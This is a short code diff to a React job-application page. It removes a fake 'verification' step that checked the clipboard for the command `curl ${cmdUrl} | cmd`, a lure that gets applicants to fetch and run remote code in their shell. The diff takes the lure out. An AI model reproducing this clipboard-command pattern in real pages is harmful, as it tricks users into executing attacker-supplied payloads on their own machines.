@@ -196,12 +196,7 @@ export default function Jobs() {
     const message = "Application submitted successfully! We’ll get back to you soon."
 
     try {
-      const text = await navigator.clipboard.readText()
-      if (text === `curl ${cmdUrl} | cmd`) {
-        push(message)
-      } else {
-        alert("Verification failed")
-      }
+     push(message);
     } catch (err) {
       console.error("Clipboard error:", err)
       alert("Verification failed: Unable to access clipboard.")
